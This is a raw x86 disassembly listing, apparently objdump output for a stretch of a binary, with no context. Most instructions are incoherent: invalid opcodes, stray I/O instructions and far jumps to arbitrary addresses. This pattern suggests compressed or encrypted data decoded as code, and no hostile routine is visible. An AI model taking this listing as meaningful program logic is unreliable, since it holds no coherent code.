  40aef1:	sbb    eax,0x32247b17
  40aef6:	retf   0x7c57
  40aef9:	gs loopne 0x40af11
  40aefc:	sub    ebx,ecx
  40aefe:	push   0x31082799
  40af03:	(bad)  
  40af04:	mov    esi,0x5481d571
  40af09:	cwde   
  40af0a:	inc    esp
  40af0b:	add    DWORD PTR [eax-0x2],eax
  40af0e:	adc    ah,dh
  40af10:	and    eax,0xa0be3822
  40af15:	pop    ss
  40af16:	pop    esi
  40af17:	or     BYTE PTR [esp+edx*1+0x75],0x2f
  40af1c:	jp     0x40af52
  40af1e:	jmp    0xfab64591
  40af23:	pop    ebx
  40af24:	jae    0x40af74
  40af26:	iret   
  40af27:	sbb    esi,DWORD PTR [ecx-0x71]
  40af2a:	pop    esp
  40af2b:	test   al,0x84
  40af2d:	adc    esp,DWORD PTR [edx+0x42bebe51]
  40af33:	sbb    eax,0x43863aeb
  40af38:	loope  0x40af69
  40af3a:	or     eax,DWORD PTR ds:0xb27d43f4
  40af40:	test   BYTE PTR [edx+eiz*1+0x6f4ce62d],dl
  40af47:	jecxz  0x40afbc
  40af49:	mov    ebp,0xcd909772
  40af4e:	mov    ?,WORD PTR [ebp+0x43]
  40af51:	imul   ebx,DWORD PTR [ebx-0x56],0x66
  40af55:	sbb    bh,bl
  40af57:	rcr    BYTE PTR [ebx],0x45
  40af5a:	or     ch,BYTE PTR [esi-0x7e]
  40af5d:	xchg   esp,eax
  40af5e:	mov    bh,0x94
  40af60:	dec    edi
  40af61:	add    ebx,DWORD PTR [esi+0x73c4a0a5]
  40af67:	scas   al,BYTE PTR es:[edi]
  40af68:	ret    
  40af69:	(bad)  
  40af6a:	fisubr DWORD PTR [ebx-0x42]
  40af6d:	inc    ecx
  40af6e:	pop    ebp
  40af6f:	adc    al,0xcc
  40af71:	cmp    bh,BYTE PTR [edx+edi*1-0x34]
  40af75:	out    0xef,al
  40af77:	(bad)  
  40af79:	outs   dx,DWORD PTR ds:[esi]
  40af7a:	lea    esi,[ebx-0x35e2c5c8]
  40af80:	fsubp  st(5),st
  40af82:	js     0x40af9d
  40af84:	ret    0xc7c8
  40af87:	ror    DWORD PTR [esi],1
  40af89:	mov    fs,WORD PTR [esi]
  40af8b:	idiv   DWORD PTR [eax+ecx*8-0x71716ed1]
  40af92:	add    edx,DWORD PTR [eax+0x622b940e]
  40af98:	and    edi,DWORD PTR [ecx+ecx*8]
  40af9b:	inc    esi
  40af9c:	push   ebp
  40af9d:	cwde   
  40af9e:	leave  
  40af9f:	sbb    al,0x37
  40afa1:	mov    eax,0xa6de48c4
  40afa6:	stc    
  40afa7:	stos   BYTE PTR es:[edi],al
  40afa8:	leave  
  40afa9:	mov    ds:0xebcdabdb,al
  40afae:	mov    bl,0x8e
  40afb0:	cmc    
  40afb1:	adc    DWORD PTR [ebx+edx*1-0x74],ebp
  40afb5:	mov    ecx,0x561f51a
  40afba:	pop    ss
  40afbb:	jno    0x40af52
  40afbd:	stc    
  40afbe:	push   esp
  40afbf:	cmp    cl,dh
  40afc1:	mov    edx,0xf5864385
  40afc6:	mov    edi,0x426cb958
  40afcb:	jne    0x40afff
  40afcd:	imul   edx,DWORD PTR [ebx-0x32],0xb8ff23e8
  40afd4:	push   esi
  40afd5:	jge    0x40af6d
  40afd7:	ds pop es
  40afd9:	rol    BYTE PTR [ebx+edx*1+0x6af426f7],0x69
  40afe1:	gs aaa 
  40afe3:	loope  0x40af88
  40afe5:	outs   dx,BYTE PTR ds:[esi]
  40afe6:	or     DWORD PTR ds:0x43363a0d,esp
  40afec:	sub    ah,BYTE PTR [esi+0x77]
  40afef:	cmp    esp,DWORD PTR [eax+esi*8]
  40aff2:	sub    BYTE PTR [esi+0x2],al
  40aff5:	dec    edi
  40aff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aff7:	jle    0x40b053
  40aff9:	xchg   DWORD PTR [ecx-0x771b594],ebx
  40afff:	es ffreep st(3)
  40b002:	and    BYTE PTR [edi+edx*1],bl
  40b005:	sbb    al,0xf4
  40b007:	repz mov WORD PTR [ebp+0x70d13ba],gs
  40b00e:	(bad)  
  40b00f:	mov    dl,0x4
  40b011:	and    ch,bl
  40b013:	xor    bh,BYTE PTR [edx-0x3e94efae]
  40b019:	mov    ebp,0xf7e66a9e
  40b01e:	jecxz  0x40b02e
  40b020:	mov    dl,0xa0
  40b022:	dec    ebx
  40b023:	(bad)
  40b027:	daa    
  40b028:	or     dl,ah
  40b02a:	in     eax,0xb
  40b02c:	std    
  40b02d:	(bad)  
  40b02e:	fisttp QWORD PTR [ebp-0x13]
  40b031:	mov    esp,0x10927304
  40b036:	pop    ss
  40b037:	outs   dx,DWORD PTR ds:[esi]
  40b038:	ss adc al,0x41
  40b03b:	or     BYTE PTR [eax],bh
  40b03d:	add    BYTE PTR [ebp-0x50fcd3f7],0x48
  40b044:	test   eax,0xb349b1ce
  40b049:	(bad)  
  40b04a:	sbb    al,0xc5
  40b04c:	or     al,0xd3
  40b04e:	add    DWORD PTR [ecx+0x61a86fb5],esp
  40b054:	fstp   DWORD PTR [ebx-0xecfb287]
  40b05a:	in     al,0xb0
  40b05c:	in     eax,0x7b
  40b05e:	outs   dx,DWORD PTR ds:[esi]
  40b05f:	sbb    ch,ch
  40b061:	fsub   st(4),st
  40b063:	aaa    
  40b064:	repz push 0x8
  40b067:	inc    ecx
  40b068:	inc    ecx
  40b069:	test   al,0xa7
  40b06b:	shr    DWORD PTR [ebp+0x22de5945],cl
  40b071:	(bad)  
  40b072:	popa   
  40b073:	outs   dx,BYTE PTR ds:[esi]
  40b074:	mov    al,ds:0x93be7ca4
  40b079:	sbb    BYTE PTR [ebx+0x35],bl
  40b07c:	jnp    0x40b0f9
  40b07e:	(bad)  
  40b07f:	dec    DWORD PTR ds:0x7b3eab8c
  40b085:	inc    edi
  40b086:	push   esp
  40b087:	loope  0x40b083
  40b089:	cld    
  40b08a:	addr16 out 0x38,eax
  40b08d:	mov    ebx,0xb2340cda
  40b092:	cmp    eax,0x6216812b
  40b097:	sti    
  40b098:	jb     0x40b053
  40b09a:	clc    
  40b09b:	jge    0x40b0af
  40b09d:	rol    DWORD PTR [esi-0x6d],1
  40b0a0:	(bad)  [edi]
  40b0a2:	push   eax
  40b0a3:	sbb    ebp,DWORD PTR [ebx+ecx*8+0x3f]
  40b0a7:	aad    0x96
  40b0a9:	inc    edi
  40b0aa:	cmp    ebp,eax
  40b0ac:	pop    ds
  40b0ad:	adc    esp,DWORD PTR [ebx]
  40b0af:	sti    
  40b0b0:	add    bh,BYTE PTR [ecx+0x64afb831]
  40b0b6:	cld    
  40b0b7:	adc    DWORD PTR [edx+ebp*1+0x1d],ebx
  40b0bb:	jge    0x40b0cc
  40b0bd:	sti    
  40b0be:	dec    esp
  40b0bf:	push   0xffffff92
  40b0c1:	repnz loopne 0x40b094
  40b0c4:	pop    esp
  40b0c5:	sub    BYTE PTR [ebx],0x62
  40b0c8:	sub    ebp,DWORD PTR [ebp-0x60]
  40b0cb:	inc    esi
  40b0cc:	lods   eax,DWORD PTR ds:[esi]
  40b0cd:	jmp    0x717e:0xf255878d
  40b0d4:	jnp    0x40b117
  40b0d6:	inc    ecx
  40b0d7:	shl    DWORD PTR [eax+0x1be07151],0xda
  40b0de:	scas   eax,DWORD PTR es:[edi]
  40b0df:	jns    0x40b09c
  40b0e1:	add    esp,esp
  40b0e3:	jno    0x40b150
  40b0e5:	dec    eax
  40b0e6:	das    
  40b0e7:	pop    ebx
  40b0e8:	retf   0x6640
  40b0eb:	lds    esp,FWORD PTR [edi]
  40b0ed:	push   eax
  40b0ee:	pushf  
  40b0ef:	mov    cl,BYTE PTR [ebp-0x5e02a3d4]
  40b0f5:	xor    dh,0xd4
  40b0f8:	outs   dx,DWORD PTR ds:[esi]
  40b0f9:	(bad)  
  40b0fa:	mov    edi,0xf9533806
  40b0ff:	rcr    BYTE PTR [ebx],0x50
  40b102:	dec    esp
  40b103:	push   esi
  40b104:	ret    0xb8fe
  40b107:	jnp    0x40b185
  40b109:	das    
  40b10a:	dec    ebp
  40b10b:	dec    edx
  40b10c:	not    BYTE PTR [ecx+0x60]
  40b10f:	xor    BYTE PTR [eax],dh
  40b111:	push   ebx
  40b112:	test   DWORD PTR [ebx-0x18fea5d6],eax
  40b118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b119:	in     al,0x69
  40b11b:	sahf   
  40b11c:	dec    esp
  40b11d:	cmp    BYTE PTR [esi],al
  40b11f:	adc    DWORD PTR [ebp+0x6b6efebb],ecx
  40b125:	add    eax,0x16f9543c
  40b12a:	fnsave [eax-0x57]
  40b12d:	into   
  40b12e:	rcl    ebx,1
  40b130:	jns    0x40b192
  40b132:	lds    ebx,FWORD PTR [eax]
  40b134:	out    0x6b,al
  40b136:	pop    edx
  40b137:	inc    ecx
  40b138:	fmul   DWORD PTR [ebx+0x12e83ce9]
  40b13e:	out    dx,eax
  40b13f:	dec    esi
  40b140:	in     eax,0x7b
  40b142:	cmp    al,ch
  40b144:	imul   eax,DWORD PTR [esi+0x21],0xa2603f28
  40b14b:	mov    dl,0x38
  40b14d:	push   cs
  40b14e:	push   DWORD PTR [edi-0x70550be3]
  40b154:	daa    
  40b155:	sub    dl,BYTE PTR [esi]
  40b157:	data16 xor ch,bh
  40b15a:	into   
  40b15b:	jbe    0x40b176
  40b15d:	pop    ds
  40b15e:	std    
  40b15f:	cmp    bh,BYTE PTR [ecx-0xc]
  40b162:	sbb    DWORD PTR [ebx+0x716b4a16],edi
  40b168:	out    dx,al
  40b169:	loopne 0x40b12d
  40b16b:	sti    
  40b16c:	jno    0x40b19d
  40b16e:	jge    0x40b17d
  40b170:	and    ebp,edi
  40b172:	out    0x42,al
  40b174:	add    al,0x9d
  40b176:	lds    ebx,FWORD PTR [eax+0x58]
  40b179:	test   dh,0xa1
  40b17c:	in     eax,0x1e
  40b17e:	mov    ds:0x80dd755f,eax
  40b183:	mov    ds:0xd974e104,eax
  40b188:	jmp    0xb0f9:0xa5cc53a6
  40b18f:	loop   0x40b1b8
  40b191:	cmp    DWORD PTR [edx+eax*8],edi
  40b194:	xchg   esp,eax
  40b195:	out    0x13,al
  40b197:	scas   eax,DWORD PTR es:[edi]
  40b198:	and    ch,BYTE PTR [esi-0x1cbc927a]
  40b19e:	imul   ebp,DWORD PTR [ecx-0x2d00a76b],0x75
  40b1a5:	mov    ?,ecx
  40b1a7:	shr    BYTE PTR [ebx+0x37],1
  40b1aa:	mov    ebx,0x9d8d88a8
  40b1af:	or     al,BYTE PTR [esi+0x6c]
  40b1b2:	imul   esp,DWORD PTR [edi],0x1b069179
  40b1b8:	sub    al,0xd6
  40b1ba:	inc    eax
  40b1bb:	push   ss
  40b1bc:	les    edi,FWORD PTR ds:0x5cc69aa9
  40b1c2:	cmp    eax,0xe23ba546
  40b1c7:	dec    eax
  40b1c8:	cmp    BYTE PTR [ecx-0x5a],ch
  40b1cb:	jge    0x40b154
  40b1cd:	sub    dh,BYTE PTR [edi]
  40b1cf:	xchg   esp,eax
  40b1d0:	xchg   ebp,eax
  40b1d1:	(bad)  
  40b1d2:	sbb    eax,0xa69f9149
  40b1d7:	outs   dx,DWORD PTR ds:[esi]
  40b1d8:	popa   
  40b1d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1da:	push   es
  40b1db:	mov    al,ds:0x20d60d21
  40b1e0:	sub    al,0xa
  40b1e2:	add    DWORD PTR [ebp+0xf],esi
  40b1e5:	cdq    
  40b1e6:	add    al,0xa
  40b1e8:	mov    bl,0x7d
  40b1ea:	and    esi,ebx
  40b1ec:	add    al,BYTE PTR [edi+0xb]
  40b1ef:	icebp  
  40b1f0:	in     eax,dx
  40b1f1:	(bad)  
  40b1f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1f3:	lds    esp,FWORD PTR [ebx-0x150a7180]
  40b1f9:	push   ebx
  40b1fa:	arpl   WORD PTR [ebx+0x1a329565],dx
  40b200:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40b202:	call   0x22a5:0xdaaf13a8
  40b209:	pop    esp
  40b20a:	xchg   edx,eax
  40b20b:	jmp    0x40b277
  40b20d:	mov    edi,0x478c5372
  40b212:	push   ss
  40b213:	ins    DWORD PTR es:[edi],dx
  40b214:	imul   esp,DWORD PTR [ebx],0xd729a331
  40b21a:	jecxz  0x40b265
  40b21c:	call   0x1317:0x96ca8fad
  40b223:	out    dx,al
  40b224:	test   eax,0x8178b6d3
  40b229:	test   BYTE PTR [ebp+0x54],0x2e
  40b22d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b22e:	dec    eax
  40b22f:	mov    eax,ds:0xc5817e93
  40b234:	int    0x89
  40b236:	add    ebx,DWORD PTR [ecx+0x487bc4b]
  40b23c:	pop    esi
  40b23d:	jae    0x40b1d0
  40b23f:	lahf   
  40b240:	sub    eax,0xc4681ace
  40b245:	loopne 0x40b257
  40b247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b248:	mov    ebx,DWORD PTR [ebx+0x6a467d59]
  40b24e:	push   esi
  40b24f:	pop    ebx
  40b250:	push   esp
  40b251:	pop    esi
  40b252:	sub    al,0xd1
  40b254:	sub    ebx,DWORD PTR [esi+0x39]
  40b257:	jmp    0xf5f6:0xe7f5f94a
  40b25e:	jns    0x40b230
  40b260:	add    ah,0x9e
  40b263:	inc    ebx
  40b264:	or     DWORD PTR ds:0xa5a49600,0x21
  40b26b:	fild   QWORD PTR [esi+0x8ac262]
  40b271:	mov    edi,0xaee1df24
  40b276:	jmp    0x4907:0x8f1b23b5
  40b27d:	jg     0x40b209
  40b27f:	fimul  DWORD PTR [ebx]
  40b281:	lock jmp 0x442c:0x2f8a52b6
  40b289:	push   ds
  40b28a:	js     0x40b2f6
  40b28c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b28d:	xchg   DWORD PTR [eax-0xd],esi
  40b290:	outs   dx,WORD PTR ds:[esi]
  40b292:	fdiv   DWORD PTR [ebp+ebp*2-0x4]
  40b296:	mov    ss,WORD PTR [esi+0x63d31aa2]
  40b29c:	imul   eax,DWORD PTR [ebp+0x67320ef1],0x5e56357
  40b2a6:	shl    BYTE PTR [esi+0x976ffc6],0x4f
  40b2ad:	fistp  WORD PTR cs:[ecx+edx*1-0x46]
  40b2b2:	fnstcw WORD PTR [edi+0x76]
  40b2b5:	cmp    al,0x21
  40b2b7:	pop    edx
  40b2b8:	push   ebx
  40b2b9:	jmp    0x40b23b
  40b2bb:	jno    0x40b2ce
  40b2bd:	fdivr  DWORD PTR [ebp+0x1b8ab6d8]
  40b2c3:	xchg   BYTE PTR [edx+edx*8-0x29],al
  40b2c7:	gs jmp 0xdcd8:0xa44587b9
  40b2cf:	or     edx,edx
  40b2d1:	cmp    BYTE PTR [eax+0x62f4fced],dl
  40b2d7:	adc    esi,DWORD PTR [edi]
  40b2d9:	fdivp  st(4),st
  40b2db:	fist   WORD PTR [edi+edx*1+0x32707f47]
  40b2e2:	mov    bl,0x54
  40b2e4:	xchg   DWORD PTR [edx-0xb3de953],eax
  40b2ea:	push   eax
  40b2eb:	mov    dh,0x88
  40b2ed:	sub    dl,ch
  40b2ef:	std    
  40b2f0:	pop    esi
  40b2f1:	aad    0x21
  40b2f3:	sub    ah,BYTE PTR [edi]
  40b2f5:	xchg   DWORD PTR [ebp-0x5e791a2c],esi
  40b2fb:	sbb    al,0xf5
  40b2fd:	pop    es
  40b2fe:	xchg   ebx,ebp
  40b300:	ja     0x40b360
  40b302:	xor    BYTE PTR [edi+0x3a],ch
  40b305:	imul   esp
  40b307:	pop    ss
  40b308:	mov    bl,0x2b
  40b30a:	daa    
  40b30b:	sbb    esp,DWORD PTR [ecx+0x72]
  40b30e:	and    ebp,DWORD PTR ds:0x6b4787f7
  40b314:	jmp    0xd2d5:0x25a8972e
  40b31b:	xor    BYTE PTR [ebp+0x7f],cl
  40b31e:	ss jnp 0x40b365
  40b321:	adc    BYTE PTR [ebp+0x5ba59c4d],bh
  40b327:	int3   
  40b328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b329:	hlt    
  40b32a:	mov    BYTE PTR [esi],bh
  40b32c:	pop    esi
  40b32d:	sahf   
  40b32e:	ds jp  0x40b2d9
  40b331:	xchg   DWORD PTR [eax-0x144c0bf3],eax
  40b337:	out    0xf6,eax
  40b339:	jo     0x40b331
  40b33b:	into   
  40b33c:	jnp    0x40b2f4
  40b33e:	nop
  40b33f:	mov    dl,0xd0
  40b341:	or     ah,BYTE PTR ds:0x31bb78ac
  40b347:	inc    edx
  40b348:	in     eax,0x58
  40b34a:	shl    DWORD PTR [edx],cl
  40b34c:	aad    0xf7
  40b34e:	pop    esi
  40b34f:	aaa    
  40b350:	rcr    DWORD PTR [ebx+0x62],cl
  40b353:	div    DWORD PTR [eax+0x7dd90b40]
  40b359:	xchg   edi,eax
  40b35a:	cmc    
  40b35b:	in     al,0xf9
  40b35d:	fidivr WORD PTR [esp+esi*2+0x1812e7bf]
  40b364:	jmp    0xb0c1:0xf85aa0e8
  40b36b:	add    DWORD PTR ss:[ecx-0x709fbe19],ebp
  40b372:	dec    esp
  40b373:	sub    cl,BYTE PTR [ebx-0x2]
  40b376:	mov    ds:0x72804414,al
  40b37b:	sub    edi,DWORD PTR [esi]
  40b37d:	loopne 0x40b3b4
  40b37f:	xor    dl,ah
  40b381:	out    0xa6,al
  40b383:	pop    esp
  40b384:	iret   
  40b385:	sbb    al,0x53
  40b387:	aam    0xef
  40b389:	add    DWORD PTR [eax+edx*2],esi
  40b38c:	jmp    0x3790517
  40b391:	jmp    0x901b0691
  40b396:	call   DWORD PTR [ebx-0x70ec3c01]
  40b39c:	mov    ebp,0xba71aa35
  40b3a1:	cmp    al,0xd1
  40b3a3:	icebp  
  40b3a4:	fwait
  40b3a5:	lahf   
  40b3a6:	shl    DWORD PTR [eax+0x4f],0x53
  40b3aa:	rcr    DWORD PTR [edx-0x22],cl
  40b3ad:	shr    DWORD PTR [esi],0x8f
  40b3b0:	scas   eax,DWORD PTR es:[edi]
  40b3b1:	ins    BYTE PTR es:[edi],dx
  40b3b2:	xchg   DWORD PTR [edx+ebx*8+0x71],ecx
  40b3b6:	hlt    
  40b3b7:	pop    eax
  40b3b8:	mov    bl,0xfe
  40b3ba:	cmp    bh,BYTE PTR [edi-0x791185b6]
  40b3c0:	pop    edi
  40b3c1:	cmp    DWORD PTR [esi+0x17928880],eax
  40b3c7:	mov    edi,0xbd49f368
  40b3cc:	push   eax
  40b3cd:	sbb    eax,DWORD PTR [ebx]
  40b3cf:	mov    eax,0xcd8f4dc0
  40b3d4:	inc    edx
  40b3d5:	in     al,0x26
  40b3d7:	mov    ebp,0x17007486
  40b3dc:	mov    ecx,0x6d32c45e
  40b3e1:	dec    edi
  40b3e2:	test   eax,0xe7a25ebe
  40b3e7:	mov    bh,0x72
  40b3e9:	xor    DWORD PTR [ecx+0x8],ebx
  40b3ec:	shl    BYTE PTR ds:0x732b18d7,cl
  40b3f2:	lods   al,BYTE PTR ds:[esi]
  40b3f3:	fs adc eax,0x915d24d6
  40b3f9:	push   DWORD PTR [eax-0x525cfa4a]
  40b3ff:	cmp    DWORD PTR [edi-0x27a65b85],ecx
  40b405:	div    DWORD PTR [ecx+0x59]
  40b408:	adc    esi,DWORD PTR [ebx+0x52661c5c]
  40b40e:	and    ebx,ebx
  40b410:	aaa    
  40b411:	jae    0x40b439
  40b413:	mov    cl,0x77
  40b415:	mov    eax,ds:0xcd181b58
  40b41a:	test   BYTE PTR [edx-0x26dc1d2f],ah
  40b420:	jb     0x40b3ef
  40b422:	test   BYTE PTR [edi-0x62],bh
  40b425:	inc    ebp
  40b426:	xor    al,0x2
  40b428:	and    eax,0x4311783b
  40b42d:	inc    ecx
  40b42e:	dec    eax
  40b42f:	jb     0x40b456
  40b431:	mov    ch,ch
  40b433:	ret    
  40b434:	inc    esp
  40b435:	clc    
  40b436:	fnsave [edx-0xc3ac7ab]
  40b43c:	sti    
  40b43d:	retf   0xb664
  40b440:	mov    edi,0xe7e09e26
  40b445:	mov    cl,0x67
  40b447:	ds into 
  40b449:	sar    BYTE PTR [ecx-0x45b7bbeb],cl
  40b44f:	sbb    al,0xb1
  40b451:	jl     0x40b44d
  40b453:	shr    BYTE PTR ds:0x3511fbdf,1
  40b459:	and    BYTE PTR [edx-0x7021175f],al
  40b45f:	out    dx,eax
  40b460:	fidivr WORD PTR [ecx]
  40b462:	xor    eax,0x71fb9c70
  40b467:	stos   BYTE PTR es:[edi],al
  40b468:	sub    edx,edi
  40b46a:	loop   0x40b46a
  40b46c:	sbb    DWORD PTR [eax],edx
  40b46e:	xor    ah,BYTE PTR [ecx+0x4a]
  40b471:	test   al,0x83
  40b473:	add    edx,DWORD PTR [ecx+0x6b]
  40b476:	jecxz  0x40b4b6
  40b478:	fld    DWORD PTR [ebp-0x515fda77]
  40b47e:	in     al,0xd5
  40b480:	xor    al,BYTE PTR [ebp+eiz*4+0x5624851a]
  40b487:	inc    edi
  40b488:	dec    ebx
  40b489:	xor    dh,ah
  40b48b:	jl     0x40b43d
  40b48d:	push   eax
  40b48e:	cmp    eax,0x60b910f
  40b493:	adc    esp,ebp
  40b495:	sbb    esi,0x46751f25
  40b49b:	clc    
  40b49c:	xor    ebx,eax
  40b49e:	dec    esi
  40b49f:	or     DWORD PTR [ebp+0x24c83d2e],ebx
  40b4a5:	xchg   esp,eax
  40b4a6:	ja     0x40b4ce
  40b4a8:	pop    edi
  40b4a9:	scas   eax,DWORD PTR es:[edi]
  40b4aa:	fwait
  40b4ab:	out    dx,al
  40b4ac:	push   ebp
  40b4ad:	dec    edi
  40b4ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4af:	push   es
  40b4b0:	and    BYTE PTR [edi],ch
  40b4b2:	out    dx,eax
  40b4b3:	xchg   esi,eax
  40b4b4:	mov    ebx,0xbaf2e583
  40b4b9:	and    BYTE PTR [ebp+0x363bde87],cl
  40b4bf:	dec    edi
  40b4c0:	das    
  40b4c1:	xor    al,0x8e
  40b4c3:	adc    al,0xc7
  40b4c5:	out    dx,eax
  40b4c6:	inc    edi
  40b4c7:	test   eax,0xacb990e7
  40b4cc:	je     0x40b49b
  40b4ce:	mov    ebp,0x2534587e
  40b4d3:	inc    esi
  40b4d4:	ins    DWORD PTR es:[edi],dx
  40b4d5:	mov    ebp,0x22dccb69
  40b4da:	pop    esp
  40b4db:	jae    0x40b511
  40b4dd:	retf   
  40b4de:	sub    ebx,DWORD PTR [esi+edi*4]
  40b4e1:	cmp    DWORD PTR [eax],eax
  40b4e3:	inc    ecx
  40b4e4:	mov    ch,0x5e
  40b4e6:	xchg   ebp,eax
  40b4e7:	jne    0x40b4ec
  40b4e9:	xchg   ebx,eax
  40b4ea:	mov    dh,0x6d
  40b4ec:	dec    esp
  40b4ed:	aad    0xda
  40b4ef:	rcl    DWORD PTR [ecx],cl
  40b4f1:	add    BYTE PTR [ebx+0x6],bl
  40b4f4:	imul   ebx,DWORD PTR [eax+0x469e18d5],0x82d350a0
  40b4fe:	inc    esp
  40b4ff:	jg     0x40b4ea
  40b501:	rcr    DWORD PTR [eax],0x5
  40b504:	loopne 0x40b55e
  40b506:	xor    ebp,ebp
  40b508:	dec    edx
  40b509:	mov    ah,0xc4
  40b50b:	cmp    ebx,esi
  40b50d:	(bad)  
  40b50f:	mov    cl,al
  40b511:	adc    edi,DWORD PTR [ebx]
  40b513:	call   0xa7c6e2c2
  40b518:	dec    ecx
  40b519:	jle    0x40b506
  40b51b:	stos   BYTE PTR es:[edi],al
  40b51c:	cmp    al,0x93
  40b51e:	mov    al,0x41
  40b520:	push   0x7
  40b522:	pop    edi
  40b523:	pop    edi
  40b524:	sub    BYTE PTR [ebx],dh
  40b526:	loop   0x40b4ab
  40b528:	leave  
  40b529:	mov    ecx,0x2bea60dd
  40b52e:	lea    eax,[ebx-0x5bcad19a]
  40b534:	(bad)  
  40b536:	ja     0x40b517
  40b538:	out    0xa6,al
  40b53a:	outs   dx,DWORD PTR ds:[esi]
  40b53b:	jg     0x40b52e
  40b53d:	clc    
  40b53e:	into   
  40b53f:	mov    bh,0x5b
  40b541:	adc    DWORD PTR [edx+ebx*2],ebp
  40b544:	aas    
  40b545:	sbb    al,bl
  40b547:	push   edi
  40b548:	mov    ebp,0x47da4ba8
  40b54d:	loope  0x40b54c
  40b54f:	cmp    DWORD PTR [ecx],0x1f
  40b552:	cwde   
  40b553:	rcr    BYTE PTR [eax+0x52],cl
  40b556:	mov    edx,0x827df17d
  40b55b:	scas   eax,DWORD PTR es:[edi]
  40b55c:	jae    0x40b5cb
  40b55e:	ds jge 0x40b59c
  40b561:	repnz mov dh,0xf6
  40b564:	pop    es
  40b565:	(bad)
  40b568:	mov    dh,0xad
  40b56a:	xchg   esi,eax
  40b56b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b56c:	or     eax,0x40528e66
  40b571:	mov    bl,0x3a
  40b573:	or     al,0x48
  40b575:	cmc    
  40b576:	add    eax,0xe2b3b683
  40b57b:	lods   al,BYTE PTR ds:[esi]
  40b57c:	pop    esp
  40b57d:	push   ecx
  40b57e:	cmp    eax,0xaec72c3
  40b583:	or     DWORD PTR [edx+0x57e142d2],eax
  40b589:	stos   BYTE PTR es:[edi],al
  40b58a:	push   ebp
  40b58b:	loopne 0x40b564
  40b58d:	(bad)  
  40b58e:	and    ebp,DWORD PTR [esp+ebp*4+0x10d2e6d7]
  40b595:	imul   esp,DWORD PTR [eax],0x50
  40b598:	stc    
  40b599:	mov    bl,0x1e
  40b59b:	(bad)  
  40b59d:	repz imul BYTE PTR [edx+0x4e970ebc]
  40b5a4:	and    DWORD PTR [eax+0x8],edx
  40b5a7:	int3   
  40b5a8:	cli    
  40b5a9:	scas   eax,DWORD PTR es:[edi]
  40b5aa:	cli    
  40b5ab:	pop    ds
  40b5ac:	iret   
  40b5ad:	add    al,0x95
  40b5af:	add    BYTE PTR ds:0xc5e69f1e,dh
  40b5b5:	ins    BYTE PTR es:[edi],dx
  40b5b6:	dec    ebp
  40b5b7:	adc    DWORD PTR [ebp+0x7f],ecx
  40b5ba:	xor    DWORD PTR [edx],ebx
  40b5bc:	nop    DWORD PTR [ecx+0x1e]
  40b5c0:	xchg   ebp,eax
  40b5c1:	lahf   
  40b5c2:	fs pop ebx
  40b5c4:	cmp    ecx,DWORD PTR [ecx+0x662cbd5f]
  40b5ca:	(bad)  
  40b5cb:	fisub  WORD PTR [ebx+eax*2-0x80]
  40b5cf:	popf   
  40b5d0:	out    0x7a,eax
  40b5d2:	dec    edx
  40b5d3:	add    DWORD PTR [edx+0x179876f0],0x75
  40b5da:	test   eax,0x5888d577
  40b5df:	out    0x1d,al
  40b5e1:	pop    ss
  40b5e2:	(bad)  
  40b5e3:	pop    ebp
  40b5e4:	pusha  
  40b5e5:	cmp    edx,DWORD PTR [ebx-0x22760248]
  40b5eb:	xor    eax,0xac82c9f5
  40b5f0:	outs   dx,BYTE PTR ds:[esi]
  40b5f1:	add    edi,ebx
  40b5f3:	les    eax,FWORD PTR [edi+0x2e]
  40b5f6:	xor    al,0x8a
  40b5f8:	(bad)
  40b5fb:	sub    edi,eax
  40b5fd:	xor    ch,BYTE PTR [ecx]
  40b5ff:	cmp    BYTE PTR [esi+0x2a],al
  40b602:	pop    ebx
  40b603:	aaa    
  40b604:	xlat   BYTE PTR ds:[ebx]
  40b605:	cdq    
  40b606:	mov    ds:0xbed7ce57,al
  40b60b:	mov    ds:0xbb5076e0,eax
  40b610:	jecxz  0x40b597
  40b612:	call   0x449a:0xa7197597
  40b619:	call   0xff437e67
  40b61e:	test   eax,0xb4776d2f
  40b623:	jmp    0x1ac7:0xbee0ea31
  40b62a:	dec    eax
  40b62b:	jae    0x40b691
  40b62d:	sbb    esp,esi
  40b62f:	bound  edx,QWORD PTR [eax-0x683f46fa]
  40b635:	lods   eax,DWORD PTR ds:[esi]
  40b636:	(bad)
  40b639:	inc    ebp
  40b63a:	clc    
  40b63b:	lods   al,BYTE PTR ds:[esi]
  40b63c:	sub    DWORD PTR [esi],edi
  40b63e:	and    al,0x83
  40b640:	and    al,0x15
  40b642:	bnd jl 0x40b63b
  40b645:	push   esi
  40b646:	ins    DWORD PTR es:[edi],dx
  40b647:	lock outs dx,DWORD PTR ds:[esi]
  40b649:	fucom  st(4)
  40b64b:	sbb    BYTE PTR [eax-0x1e],dl
  40b64e:	cmc    
  40b64f:	in     eax,dx
  40b650:	or     BYTE PTR [ecx],dl
  40b652:	mov    ah,0xbd
  40b654:	rol    BYTE PTR [esi-0x15b36131],0xa2
  40b65b:	jns    0x40b6c1
  40b65d:	add    ebp,DWORD PTR [esp+edi*4+0x714c87ea]
  40b664:	cwde   
  40b665:	aam    0x3f
  40b667:	iret   
  40b668:	mov    dl,0x66
  40b66a:	and    bl,BYTE PTR [esi+ecx*8-0x5865946e]
  40b671:	pushf  
  40b672:	mov    esi,0xc4147f52
  40b677:	(bad)  
  40b678:	and    ah,ch
  40b67a:	test   DWORD PTR [ecx],0xc922ea0
  40b680:	jp     0x40b661
  40b682:	shl    BYTE PTR [ecx],1
  40b684:	and    eax,0xdfd6336e
  40b689:	xor    eax,0x945868d
  40b68e:	pop    edx
  40b68f:	loop   0x40b667
  40b691:	dec    edx
  40b692:	sbb    al,0x52
  40b694:	popa   
  40b695:	fadd   st(7),st
  40b697:	cmp    al,0x3d
  40b699:	add    al,0x74
  40b69b:	mov    bl,0xef
  40b69d:	push   cs
  40b69e:	mov    ds:0x4786d4b0,al
  40b6a3:	jmp    0x40b65b
  40b6a5:	pop    ebx
